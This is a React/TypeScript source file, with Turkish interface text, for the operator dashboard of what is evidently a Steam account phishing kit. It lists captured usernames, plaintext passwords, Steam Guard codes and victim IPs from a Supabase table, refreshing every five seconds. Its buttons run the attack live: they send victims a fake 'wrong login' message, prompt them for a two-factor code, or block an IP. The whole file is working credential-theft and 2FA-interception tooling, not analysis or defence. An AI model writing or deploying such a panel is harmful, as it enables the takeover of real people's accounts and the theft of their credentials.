import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { RefreshCcw, Shield, Ban, Wifi, WifiOff } from 'lucide-react';
import { toast } from 'sonner';
import AdminLogin from '@/components/AdminLogin';
import { supabase } from "@/integrations/supabase/client";

interface LoginAttempt {
  id: string;
  username: string;
  password: string;
  steamguard?: string;
  timestamp: string;
  ip: string;
  online: boolean;
  status: 'pending' | 'rejected' | 'awaiting_2fa' | 'completed' | 'blocked';
}

const AdminPanel = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  // Supabase'den giriş denemelerini çek
  const fetchLoginAttempts = async () => {
    setIsLoading(true);
    
    try {
      const { data, error } = await supabase
        .from('loginattempts')
        .select('*')
        .order('timestamp', { ascending: false });

      if (error) throw error;
      
      setLoginAttempts(data || []);
    } catch (error) {
      console.error('Giriş denemeleri çekilirken hata:', error);
      toast.error('Veriler yüklenirken bir hata oluştu');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchLoginAttempts();
      
      // Her 5 saniyede bir verileri güncelle
      const interval = setInterval(fetchLoginAttempts, 5000);
      
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const handleRetryRequest = async (username: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'rejected' })
        .eq('username', username)
        .eq('status', 'pending');

      if (error) throw error;
      
      toast.success("İşlem başarılı: Kullanıcıya 'Hatalı giriş' mesajı gönderildi");
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('İşlem başarısız oldu');
    }
  };

  const handleSteamGuardRequest = async (username: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'awaiting_2fa' })
        .eq('username', username)
        .eq('status', 'pending');

      if (error) throw error;
      
      toast.success("İşlem başarılı: Kullanıcıya Steam Guard kodu soruldu");
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('İşlem başarısız oldu');
    }
  };

  const handleIpBlock = async (ip: string) => {
    try {
      const { error } = await supabase
        .from('loginattempts')
        .update({ status: 'blocked' })
        .eq('ip', ip);

      if (error) throw error;
      
      toast.success(`IP Adresi başarıyla engellendi: ${ip}`);
      fetchLoginAttempts();
      
    } catch (error) {
      toast.error('IP engelleme işlemi başarısız oldu');
    }
  };

  // If not authenticated, show login screen
  if (!isAuthenticated) {
    return <AdminLogin onLoginSuccess={() => setIsAuthenticated(true)} />;
  }

  return (
    <div className="container mx-auto p-6 max-w-6xl">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Steam Panel</h1>
        <Button variant="outline" onClick={() => fetchLoginAttempts()}>
          <RefreshCcw className="mr-2 h-4 w-4" />
          Yenile
        </Button>
      </div>

      <div className="grid gap-4">
        <Card>
          <CardHeader>
            <CardTitle>Giriş Denemeleri</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="text-center py-4">Yükleniyor...</div>
            ) : loginAttempts.length === 0 ? (
              <div className="text-center py-4 text-muted-foreground">
                Henüz giriş denemesi yok
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left p-2">Kullanıcı Adı</th>
                      <th className="text-left p-2">Şifre</th>
                      <th className="text-left p-2">Steam Guard</th>
                      <th className="text-left p-2">IP Adresi</th>
                      <th className="text-left p-2">Durum</th>
                      <th className="text-left p-2">Çevrimiçi</th>
                      <th className="text-left p-2">Zaman</th>
                      <th className="text-right p-2">İşlemler</th>
                    </tr>
                  </thead>
                  <tbody>
                    {loginAttempts.map((attempt) => (
                      <tr key={attempt.id} className="border-b">
                        <td className="p-2">{attempt.username}</td>
                        <td className="p-2">{attempt.password}</td>
                        <td className="p-2">{attempt.steamguard || '-'}</td>
                        <td className="p-2">{attempt.ip}</td>
                        <td className="p-2">
                          <span className={`px-2 py-1 rounded text-xs ${
                            attempt.status === 'pending' ? 'bg-yellow-500/20 text-yellow-500' :
                            attempt.status === 'rejected' ? 'bg-red-500/20 text-red-500' :
                            attempt.status === 'awaiting_2fa' ? 'bg-blue-500/20 text-blue-500' :
                            attempt.status === 'blocked' ? 'bg-gray-500/20 text-gray-500' :
                            'bg-green-500/20 text-green-500'
                          }`}>
                            {attempt.status === 'pending' ? 'Beklemede' :
                             attempt.status === 'rejected' ? 'Reddedildi' :
                             attempt.status === 'awaiting_2fa' ? 'Steam Guard Bekliyor' :
                             attempt.status === 'blocked' ? 'Engellendi' :
                             'Tamamlandı'}
                          </span>
                        </td>
                        <td className="p-2">
                          {attempt.online ? (
                            <span className="flex items-center text-green-500">
                              <Wifi className="h-4 w-4 mr-1" /> Çevrimiçi
                            </span>
                          ) : (
                            <span className="flex items-center text-gray-500">
                              <WifiOff className="h-4 w-4 mr-1" /> Çevrimdışı
                            </span>
                          )}
                        </td>
                        <td className="p-2">{new Date(attempt.timestamp).toLocaleString()}</td>
                        <td className="p-2 text-right">
                          <div className="flex justify-end gap-2">
                            <Button 
                              variant="outline" 
                              size="sm"
                              onClick={() => handleRetryRequest(attempt.username)}
                              disabled={attempt.status !== 'pending'}
                            >
                              Tekrar Gönder
                            </Button>
                            <Button 
                              variant="outline" 
                              size="sm"
                              onClick={() => handleSteamGuardRequest(attempt.username)}
                              disabled={attempt.status !== 'pending'}
                            >
                              <Shield className="mr-1 h-3 w-3" />
                              Steam Guard İste
                            </Button>
                            <Button 
                              variant="outline" 
                              size="sm"
                              className="text-red-500 border-red-500 hover:bg-red-500/10"
                              onClick={() => handleIpBlock(attempt.ip)}
                              disabled={attempt.status === 'blocked'}
                            >
                              <Ban className="mr-1 h-3 w-3" />
                              IP Yasakla
                            </Button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default AdminPanel;
